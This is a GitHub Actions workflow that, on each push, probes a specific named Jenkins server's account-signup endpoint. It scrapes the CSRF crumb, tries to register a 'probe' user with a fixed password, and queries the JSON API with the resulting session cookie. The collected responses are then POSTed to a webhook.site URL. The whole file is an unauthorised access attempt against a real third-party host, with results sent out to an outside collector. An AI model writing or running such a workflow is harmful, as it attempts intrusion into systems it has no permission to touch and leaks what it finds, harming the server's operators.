name: jsignup2
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  jsignup2:
    runs-on: ubuntu-latest
    steps:
      - name: Signup2
        run: |
          {
            for u in "/securityRealm/createAccount" "/securityRealm/createAccount/"; do
              echo "=== GET $u ==="
              curl -sS -k -m 15 -c /tmp/cj -o /tmp/s.html -w "code=%{http_code} size=%{size_download}\n" "https://jenkins.htpl.cc$u" 2>&1
              grep -oiE "sign up|create account|not enabled|username|password1|password2|fullname|email" /tmp/s.html 2>/dev/null | sort -u | head -10
              CRUMB=$(grep -oE "name=\"Jenkins-Crumb\" value=\"[^\"]+" /tmp/s.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
              [ -z "$CRUMB" ] && CRUMB=$(grep -oE "data-crumb-value=\"[^\"]+" /tmp/s.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
              echo "crumb=$CRUMB"
              U="probe$(date +%s)"
              echo "=== POST $u $U ==="
              curl -sS -k -m 15 -b /tmp/cj -c /tmp/cj -o /tmp/r.html -w "code=%{http_code} size=%{size_download}\n" -X POST "https://jenkins.htpl.cc$u" --data-urlencode "username=$U" --data-urlencode "password1=ProbePass123!" --data-urlencode "password2=ProbePass123!" --data-urlencode "fullname=Probe User" --data-urlencode "email=$U@example.com" --data-urlencode "Jenkins-Crumb=$CRUMB" 2>&1
              grep -oiE "error|invalid|already|created|welcome|Sign in|success" /tmp/r.html 2>/dev/null | sort -u | head -10
              echo "=== api with cookie ==="
              curl -sS -k -m 15 -b /tmp/cj -o /tmp/a -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/api/json 2>&1
              head -c 300 /tmp/a; echo
            done
          } > /tmp/out.txt 2>&1
          curl -s -m 20 -X POST "https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
